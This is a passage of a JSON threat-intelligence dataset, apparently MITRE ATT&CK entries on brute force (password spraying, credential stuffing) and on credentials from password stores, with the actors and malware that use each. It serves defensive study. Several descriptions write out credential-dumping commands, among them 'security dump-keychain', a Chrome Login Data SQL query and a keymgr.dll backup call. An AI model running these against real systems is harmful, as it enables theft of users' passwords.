                "href": "/techniques/T1110/003",
                "description": "Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. [1]Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:SSH (22/TCP)Telnet (23/TCP)FTP (21/TCP)NetBIOS / SMB / Samba (139/TCP & 445/TCP)LDAP (389/TCP)Kerberos (88/TCP)RDP / Terminal Services (3389/TCP)HTTP/HTTP Management Services (80/TCP & 443/TCP)MSSQL (1433/TCP)Oracle (1521/TCP)MySQL (3306/TCP)VNC (5900/TCP)In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.[2]In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks.[3][4] <name> has also used a Kubernetes cluster to conduct distributed, large-scale password spray attacks.[5]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has conducted brute force password spray attacks.[6][7][8]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has used password spraying to gain access to target systems.[9][10]"
                    },
                    "S0606": {
                        "ID": "S0606",
                        "Name": "Bad Rabbit",
                        "Description": "<name>\u2019s infpub.dat file uses NTLM login credentials to brute force Windows machines.[11]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has used multiple password spraying attacks against victim's remote services to obtain valid user and administrator accounts.[12]"
                    },
                    "S0488": {
                        "ID": "S0488",
                        "Name": "CrackMapExec",
                        "Description": "<name> can brute force credential authentication by using a supplied list of usernames and a single password.[13]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has used password spraying attacks to obtain valid credentials.[14]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> malware attempts to connect to Windows shares for lateral movement by using a generated list of usernames, which center around permutations of the username Administrator, and weak passwords.[15][16]"
                    },
                    "G0077": {
                        "ID": "G0077",
                        "Name": "Leafminer",
                        "Description": "<name> used a tool called Total SMB BruteForcer to perform internal password spraying.[17]"
                    },
                    "S0362": {
                        "ID": "S0362",
                        "Name": "Linux Rabbit",
                        "Description": "<name> brute forces SSH passwords in order to attempt to gain access and install its malware onto the server. [18]"
                    },
                    "S0413": {
                        "ID": "S0413",
                        "Name": "MailSniper",
                        "Description": "<name> can be used for password spraying against Exchange and Office 365.[19]"
                    },
                    "G0122": {
                        "ID": "G0122",
                        "Name": "Silent Librarian",
                        "Description": "<name> has used collected lists of names and e-mail accounts to use in password spraying attacks against private sector targets.[20]"
                    }
                }
            },
            "004": {
                "name": "Credential Stuffing",
                "href": "/techniques/T1110/004",
                "description": "Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:SSH (22/TCP)Telnet (23/TCP)FTP (21/TCP)NetBIOS / SMB / Samba (139/TCP & 445/TCP)LDAP (389/TCP)Kerberos (88/TCP)RDP / Terminal Services (3389/TCP)HTTP/HTTP Management Services (80/TCP & 443/TCP)MSSQL (1433/TCP)Oracle (1521/TCP)MySQL (3306/TCP)VNC (5900/TCP)In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.[1]",
                "Procedure": {
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has used credential stuffing against victim's remote services to obtain valid accounts.[2]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> uses brute-force attack against RDP with rdpscanDll module.[3][4]"
                    }
                }
            }
        },
        "tactic": "Credential Access",
        "description": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.[1] Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism.[2] Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to Valid Accounts within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as OS Credential Dumping, Account Discovery, or Password Policy Discovery. Adversaries may also combine brute forcing activity with behaviors such as External Remote Services as part of Initial Access.",
        "Procedure": {
            "C0025": {
                "ID": "C0025",
                "Name": "2016 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team used a script to attempt RPC authentication against a number of hosts.[2]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware can perform brute force attacks to obtain credentials.[3][1][4]"
            },
            "G0082": {
                "ID": "G0082",
                "Name": "APT38",
                "Description": "malware has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable.[5]"
            },
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has used Ncrack to reveal credentials.[6]"
            },
            "S0572": {
                "ID": "S0572",
                "Name": "Caterpillar WebShell",
                "Description": "malware has a module to perform brute force attacks on a system.[7]"
            },
            "S0220": {
                "ID": "S0220",
                "Name": "Chaos",
                "Description": "malware conducts brute force attacks against SSH services to gain initial access.[8]"
            },
            "S0488": {
                "ID": "S0488",
                "Name": "CrackMapExec",
                "Description": "malware can brute force supplied user credentials across a network range.[9]"
            },
            "G0105": {
                "ID": "G0105",
                "Name": "DarkVishnya",
                "Description": "malware used brute-force attack to obtain login data.[10]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has attempted to brute force credentials to gain access.[11]"
            },
            "G0053": {
                "ID": "G0053",
                "Name": "FIN5",
                "Description": "malware has has used the tool GET2 Penetrator to look for remote login and hard-coded credentials.[12][13]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has brute forced RDP credentials.[14]"
            },
            "G1001": {
                "ID": "G1001",
                "Name": "HEXANE",
                "Description": "malware has used brute force attacks to compromise valid credentials.[15]"
            },
            "S0599": {
                "ID": "S0599",
                "Name": "Kinsing",
                "Description": "malware has attempted to brute force hosts over SSH.[16]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has used brute force techniques to obtain credentials.[17]"
            },
            "C0022": {
                "ID": "C0022",
                "Name": "Operation Dream Job",
                "Description": "During malware, Lazarus Group performed brute force attacks against administrator accounts.[18]"
            },
            "S0378": {
                "ID": "S0378",
                "Name": "PoshC2",
                "Description": "malware has modules for brute forcing local administrator and AD user accounts.[19]"
            },
            "S0583": {
                "ID": "S0583",
                "Name": "Pysa",
                "Description": "malware has used brute force attempts against a central management console, as well as some Active Directory accounts.[20]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can conduct brute force attacks to capture credentials.[21][22][23]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware may attempt to connect to systems within a victim's network using net use commands and a predefined list or collection of passwords.[24]"
            }
        }
    },
    "T1555": {
        "ttp_name": "Credentials from Password Stores",
        "ttp_id": "T1555",
        "href": "/techniques/T1555",
        "subtechnique": {
            "001": {
                "name": "Keychain",
                "href": "/techniques/T1555/001",
                "description": "Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple\u2019s iCloud service. Keychains can be viewed and edited through the Keychain Access application or using the command-line utility security. Keychain files are located in ~/Library/Keychains/, /Library/Keychains/, and /Network/Library/Keychains/.[1][2][3]Adversaries may gather user credentials from Keychain storage/memory. For example, the command security dump-keychain \u2013d will dump all Login Keychain credentials from ~/Library/Keychains/login.keychain-db. Adversaries may also directly read Login Keychain credentials from the ~/Library/Keychains/login.keychain file. Both methods require a password, where the default password for the Login Keychain is the current user\u2019s password to login to the macOS host.[4][5]",
                "Procedure": {
                    "S0274": {
                        "ID": "S0274",
                        "Name": "Calisto",
                        "Description": "<name> collects Keychain storage data and copies those passwords/tokens to a file.[6][7]"
                    },
                    "S0690": {
                        "ID": "S0690",
                        "Name": "Green Lambert",
                        "Description": "<name> can use Keychain Services API functions to find and collect passwords, such as SecKeychainFindInternetPassword and SecKeychainItemCopyAttributesAndData.[8][9]"
                    },
                    "S0278": {
                        "ID": "S0278",
                        "Name": "iKitten",
                        "Description": "<name> collects the keychains on the system.[10]"
                    },
                    "S0349": {
                        "ID": "S0349",
                        "Name": "LaZagne",
                        "Description": "<name> can obtain credentials from macOS Keychains.[11]"
                    },
                    "S1016": {
                        "ID": "S1016",
                        "Name": "MacMa",
                        "Description": "<name> can dump credentials from the macOS keychain.[12]"
                    },
                    "S0279": {
                        "ID": "S0279",
                        "Name": "Proton",
                        "Description": "<name> gathers credentials in files for keychains.[10]"
                    }
                }
            },
            "002": {
                "name": "Securityd Memory",
                "href": "/techniques/T1555/002",
                "description": "An adversary with root access may gather credentials by reading securityd\u2019s memory. securityd is a service/daemon responsible for implementing security protocols such as encryption and authorization.[1] A privileged adversary may be able to scan through securityd's memory to find the correct sequence of keys to decrypt the user\u2019s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.[2][3]In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.[2][4] Apple\u2019s securityd utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.[2]",
                "Procedure": {
                    "S0276": {
                        "ID": "S0276",
                        "Name": "Keydnap",
                        "Description": "<name> uses the keychaindump project to read securityd memory.[5]"
                    }
                }
            },
            "003": {
                "name": "Credentials from Web Browsers",
                "href": "/techniques/T1555/003",
                "description": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.[1] Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data and executing a SQL query: SELECT action_url, username_value, password_value FROM logins;. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function CryptUnprotectData, which uses the victim\u2019s cached logon credentials as the decryption key.[2]Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.[3][4] Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the Windows Credential Manager.Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.[5]After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
                "Procedure": {
                    "S0331": {
                        "ID": "S0331",
                        "Name": "Agent Tesla",
                        "Description": "<name> can gather credentials from a number of browsers.[6]"
                    },
                    "G0130": {
                        "ID": "G0130",
                        "Name": "Ajax Security Team",
                        "Description": "<name> has used FireMalv custom-developed malware, which collected passwords from the Firefox browser storage.[7]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has used tools to dump passwords from browsers.[8]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has used a variety of publicly available tools like LaZagne to gather credentials.[9][10]"
                    },
                    "G0067": {
                        "ID": "G0067",
                        "Name": "APT37",
                        "Description": "<name> has used a credential stealer known as ZUMKONG that can harvest usernames and passwords stored in browsers.[11]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> used BrowserGhost, a tool designed to obtain credentials from browsers, to retrieve information from password stores.[12]"
                    },
                    "S0344": {
                        "ID": "S0344",
                        "Name": "Azorult",
                        "Description": "<name> can steal credentials from the victim's browser.[13]"
                    },
                    "S0093": {
                        "ID": "S0093",
                        "Name": "Backdoor.Oldrea",
                        "Description": "Some <name> samples contain a publicly available Web browser password recovery tool.[14]"
                    },
                    "S0089": {
                        "ID": "S0089",
                        "Name": "BlackEnergy",
                        "Description": "<name> has used a plug-in to gather credentials from web browsers including FireFox, Google Chrome, and Internet Explorer.[15][16]"
                    },
                    "S0657": {
                        "ID": "S0657",
                        "Name": "BLUELIGHT",
                        "Description": "<name> can collect passwords stored in web browers, including Internet Explorer, Edge, Chrome, and Naver Whale.[17]"
                    },
                    "S0484": {
                        "ID": "S0484",
                        "Name": "Carberp",
                        "Description": "<name>'s passw.plug plugin can gather passwords saved in Opera, Internet Explorer, Safari, Firefox, and Chrome.[18]"
                    },
                    "S0631": {
                        "ID": "S0631",
                        "Name": "Chaes",
                        "Description": "<name> can steal login credentials and stored financial information from the browser.[19]"
                    },
                    "S0144": {
                        "ID": "S0144",
                        "Name": "ChChes",
                        "Description": "<name> steals credentials stored inside Internet Explorer.[20]"
                    },
                    "S0492": {
                        "ID": "S0492",
                        "Name": "CookieMiner",
                        "Description": "<name> can steal saved usernames and passwords in Chrome as well as credit card credentials.[21]"
                    },
                    "S0050": {
                        "ID": "S0050",
                        "Name": "CosmicDuke",
                        "Description": "<name> collects user credentials, including passwords, for various programs including Web browsers.[22]"
                    },
                    "S0115": {
                        "ID": "S0115",
                        "Name": "Crimson",
                        "Description": "<name> contains a module to steal credentials from Web browsers on the victim machine.[23][24]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has been observed dropping browser password grabber modules. [25][26]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can use modules that extract passwords from common web browsers such as Firefox and Chrome.[27]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has used the Stealer One credential stealer to target web browsers.[28]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> can steal cookie data and credentials from Google Chrome.[29][30]"
                    },
                    "S0132": {
                        "ID": "S0132",
                        "Name": "H1N1",
                        "Description": "<name> dumps usernames and passwords from Firefox, Internet Explorer, and Outlook.[31]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has used a Mimikatz-based tool and a PowerShell script to steal passwords from Google Chrome.[32]"
                    },
                    "S0434": {
                        "ID": "S0434",
                        "Name": "Imminent Monitor",
                        "Description": "<name> has a PasswordRecoveryPacket module for recovering browser passwords.[33]"
                    },
                    "G0100": {
                        "ID": "G0100",
                        "Name": "Inception",
                        "Description": "<name> used a browser plugin to steal passwords and sessions from Internet Explorer, Chrome, Opera, Firefox, Torch, and Yandex.[34]"
                    },
                    "S0528": {
                        "ID": "S0528",
                        "Name": "Javali",
                        "Description": "<name> can capture login credentials from open browsers including Firefox, Chrome, Internet Explorer, and Edge.[35]"
                    },
                    "S0283": {
                        "ID": "S0283",
                        "Name": "jRAT",
                        "Description": "<name> can capture passwords from common web browsers such as Internet Explorer, Google Chrome, and Firefox.[36]"
                    },
                    "S0387": {
                        "ID": "S0387",
                        "Name": "KeyBoy",
                        "Description": "<name> attempts to collect passwords from browsers.[37]"
                    },
                    "S0526": {
                        "ID": "S0526",
                        "Name": "KGH_SPY",
                        "Description": "<name> has the ability to steal data from the Chrome, Edge, Firefox, Thunderbird, and Opera browsers.[38]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used browser extensions including Google Chrome to steal passwords and cookies from browsers. <name> has also used Nirsoft's WebBrowserPassView tool to dump the passwords obtained from victims.[39][40][41][42]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> can steal profiles (containing credential information) from Firefox, Chrome, and Opera.[43]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has obtained passwords and session tokens with the use of the Redline password stealer.[44]"
                    },
                    "S0349": {
                        "ID": "S0349",
                        "Name": "LaZagne",
                        "Description": "<name> can obtain credentials from web browsers such as Google Chrome, Internet Explorer, and Firefox.[45]"
                    },
                    "G0077": {
                        "ID": "G0077",
                        "Name": "Leafminer",
                        "Description": "<name> used several tools for retrieving login and password information, including LaZagne.[46]"
                    },
                    "S0681": {
                        "ID": "S0681",
                        "Name": "Lizar",
                        "Description": "<name> has a module to collect usernames and passwords stored in browsers.[47]"
                    },
                    "S0447": {
                        "ID": "S0447",
                        "Name": "Lokibot",
                        "Description": "<name> has demonstrated the ability to steal credentials from multiple applications and data sources including Safari and the Chromium and Mozilla Firefox-based web browsers.[48]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "<name> collects stored credentials from several web browsers.[49]"
                    },
                    "G1026": {
                        "ID": "G1026",
                        "Name": "Malteiro",
                        "Description": "<name> has stolen credentials stored in the victim\u2019s browsers via software tool NirSoft WebBrowserPassView.[50]"
                    },
                    "S0530": {
                        "ID": "S0530",
                        "Name": "Melcoz",
                        "Description": "<name> has the ability to steal credentials from web browsers.[35]"
                    },
                    "S0002": {
                        "ID": "S0002",
                        "Name": "Mimikatz",
                        "Description": "<name> performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from DPAPI.[51][52][53][54]"
                    },
                    "S1122": {
                        "ID": "S1122",
                        "Name": "Mispadu",
                        "Description": "<name> can steal credentials from Google Chrome.[50][55][56]"
                    },
                    "G0021": {
                        "ID": "G0021",
                        "Name": "Molerats",
                        "Description": "<name> used the public tool BrowserPasswordDump10 to dump passwords saved in browsers on victims.[57]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has run tools including Browser64 to steal passwords saved in victim web browsers.[58][59]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> has the ability to steal credentials from web browsers including Internet Explorer, Opera, Yandex, and Chrome.[60][61][62]"
                    },
                    "S0385": {
                        "ID": "S0385",
                        "Name": "njRAT",
                        "Description": "<name> has a module that steals passwords saved in victim web browsers.[63][64][65]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.[66][67][68][69] <name> has also used tool named PICKPOCKET to dump passwords from web browsers.[69]"
                    },
                    "S0138": {
                        "ID": "S0138",
                        "Name": "OLDBAIT",
                        "Description": "<name> collects credentials from Internet Explorer, Mozilla Firefox, and Eudora.[70]"
                    },
                    "S0365": {
                        "ID": "S0365",
                        "Name": "Olympic Destroyer",
                        "Description": "<name> contains a module that tries to obtain stored credentials from web browsers.[1]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> dumped the login data database from \\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data.[71]"
                    },
                    "S0048": {
                        "ID": "S0048",
                        "Name": "PinchDuke",
                        "Description": "<name> steals credentials from compromised hosts. <name>'s credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by <name> include ones associated with many sources such as Netscape Navigator, Mozilla Firefox, Mozilla Thunderbird, and Internet Explorer. [22]"
                    },
                    "S0435": {
                        "ID": "S0435",
                        "Name": "PLEAD",
                        "Description": "<name> can harvest saved credentials from browsers such as Google Chrome, Microsoft Internet Explorer, and Mozilla Firefox.[72][73]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> has used a Python tool named Browdec.exe to steal browser credentials.[74]"
                    },
                    "S0113": {
                        "ID": "S0113",
                        "Name": "Prikormka",
                        "Description": "A module in <name> gathers logins and passwords stored in applications on the victims, including Google Chrome, Mozilla Firefox, and several other browsers.[75]"
                    },
                    "S0279": {
                        "ID": "S0279",
                        "Name": "Proton",
                        "Description": "<name> gathers credentials for Google Chrome.[76]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can use Lazagne for harvesting credentials.[77]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> has collected usernames and passwords from Firefox and Chrome.[78]"
                    },
                    "S0262": {
                        "ID": "S0262",
                        "Name": "QuasarRAT",
                        "Description": "<name> can obtain passwords from common web browsers.[79][80]"
                    },
                    "S0629": {
                        "ID": "S0629",
                        "Name": "RainyDay",
                        "Description": "<name> can use tools to collect credentials from web browsers.[81]"
                    },
                    "S0153": {
                        "ID": "S0153",
                        "Name": "RedLeaves",
                        "Description": "<name> can gather browser usernames and passwords.[82]"
                    },
                    "S0240": {
                        "ID": "S0240",
                        "Name": "ROKRAT",
                        "Description": "<name> can steal credentials stored in Web browsers by querying the sqlite database.[83]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name>'s CredRaptor tool can collect saved passwords from various internet browsers.[84]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> can collect clear text web credentials for Internet Explorer/Edge.[85]"
                    },
                    "S0226": {
                        "ID": "S0226",
                        "Name": "Smoke Loader",
                        "Description": "<name> searches for credentials stored from web browsers.[86]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 stole users' saved passwords from Chrome.[87]"
                    },
                    "G0038": {
                        "ID": "G0038",
                        "Name": "Stealth Falcon",
                        "Description": "<name> malware gathers passwords from multiple sources, including Internet Explorer, Firefox, and Chrome.[88]"
                    },
                    "S1042": {
                        "ID": "S1042",
                        "Name": "SUGARDUMP",
                        "Description": "<name> variants have harvested credentials from browsers such as Firefox, Chrome, Opera, and Edge.[89]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used malware to gather credentials from Internet Explorer.[90]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> can obtain passwords stored in files from web browsers such as Chrome, Firefox, Internet Explorer, and Microsoft Edge, sometimes using esentutl.[91][92][93]"
                    },
                    "S0094": {
                        "ID": "S0094",
                        "Name": "Trojan.Karagany",
                        "Description": "<name> can steal data and credentials from browsers.[94]"
                    },
                    "S0436": {
                        "ID": "S0436",
                        "Name": "TSCookie",
                        "Description": "<name> has the ability to steal saved passwords from the Internet Explorer, Edge, Firefox, and Chrome browsers.[95]"
                    },
                    "S0130": {
                        "ID": "S0130",
                        "Name": "Unknown Logger",
                        "Description": "<name> is capable of stealing usernames and passwords from browsers on the victim machine.[96]"
                    },
                    "S0670": {
                        "ID": "S0670",
                        "Name": "WarzoneRAT",
                        "Description": "<name> has the capability to grab passwords from numerous web browsers as well as from Outlook and Thunderbird email clients.[97][98]"
                    },
                    "S0161": {
                        "ID": "S0161",
                        "Name": "XAgentOSX",
                        "Description": "<name> contains the getFirefoxPassword function to attempt to locate Firefox passwords.[99]"
                    },
                    "S0251": {
                        "ID": "S0251",
                        "Name": "Zebrocy",
                        "Description": "<name> has the capability to upload dumper tools that extract credentials from web browsers and store them in database files.[100]"
                    },
                    "G0128": {
                        "ID": "G0128",
                        "Name": "ZIRCONIUM",
                        "Description": "<name> has used a tool to steal credentials from installed web browsers including Microsoft Internet Explorer and Google Chrome.[101]"
                    }
                }
            },
            "004": {
                "name": "Windows Credential Manager",
                "href": "/techniques/T1555/004",
                "description": "Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).[1][2]The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of Credentials from Web Browsers, Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.Credential Lockers store credentials in encrypted .vcrd files, located under %Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\. The encryption key can be found in a file named Policy.vpol, typically located in the same folder as the credentials.[3][4]Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms. vaultcmd.exe is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as CredEnumerateA, may also be absued to list credentials managed by the Credential Manager.[5][6]Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running rundll32.exe keymgr.dll KRShowKeyMgr then selecting the \"Back up...\" button on the \"Stored User Names and Passwords\" GUI.Password recovery tools may also obtain plain text passwords from the Credential Manager.[4]",
                "Procedure": {
                    "S0526": {
                        "ID": "S0526",
                        "Name": "KGH_SPY",
                        "Description": "<name> can collect credentials from the Windows Credential Manager.[7]"
                    },
                    "S0349": {
                        "ID": "S0349",
                        "Name": "LaZagne",
                        "Description": "<name> can obtain credentials from Vault files.[8]"
                    },
                    "S0681": {
                        "ID": "S0681",
                        "Name": "Lizar",
                        "Description": "<name> has a plugin that can retrieve credentials from Internet Explorer and Microsoft Edge using vaultcmd.exe and another that can collect RDP access credentials using the CredEnumerateW function.[9]"
                    },
                    "S0002": {
                        "ID": "S0002",
                        "Name": "Mimikatz",
                        "Description": "<name> contains functionality to acquire credentials from the Windows Credential Manager.[6]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used credential dumping tool named VALUEVAULT to steal credentials from the Windows Credential Manager.[10]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name> contains a collection of Exfiltration modules that can harvest credentials from Windows vault credential objects.[11][12]"
                    },
                    "S0629": {
                        "ID": "S0629",
                        "Name": "RainyDay",
                        "Description": "<name> can use the QuarksPwDump tool to obtain local passwords and domain cached credentials.[13]"
                    },
                    "S0240": {
                        "ID": "S0240",
                        "Name": "ROKRAT",
                        "Description": "<name> can steal credentials by leveraging the Windows Vault mechanism.[14]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> can gather Windows Vault credentials.[15]"
                    },
                    "G0038": {
                        "ID": "G0038",
                        "Name": "Stealth Falcon",
                        "Description": "<name> malware gathers passwords from the Windows Credential Vault.[16]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has gathered credentials from the Windows Credential Manager tool.[17]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> can use a .NET compiled module named exchgrabber to enumerate credentials from the Credential Manager.[18]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used PowerShell cmdlet Invoke-WCMDump to enumerate Windows credentials in the Credential Manager in a compromised network.[19]"
                    }
                }
            },
            "005": {
                "name": "Password Managers",
                "href": "/techniques/T1555/005",
                "description": "Adversaries may acquire user credentials from third-party password managers.[1] Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.[1]Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.[2][3] Adversaries may extract credentials from memory via Exploitation for Credential Access.[4] Adversaries may also try brute forcing via Password Guessing to obtain the master password of a password manager.[5]",
                "Procedure": {
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has used scripts to access credential information from the KeePass database.[6]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has accessed local password managers and databases to obtain further credentials from a compromised network.[7]"
                    },
                    "S0652": {
                        "ID": "S0652",
                        "Name": "MarkiRAT",
                        "Description": "<name> can gather information from the Keepass password manager.[8]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors accessed and collected credentials from password managers.[2]"
                    },
                    "S0279": {
                        "ID": "S0279",
                        "Name": "Proton",
                        "Description": "<name> gathers credentials in files for 1password.[9]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> obtained a KeePass database from a compromised host.[10]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> can steal passwords from the KeePass open source password manager.[5]"
                    }
                }
            },
            "006": {
                "name": "Cloud Secrets Management Stores",
                "href": "/techniques/T1555/006",
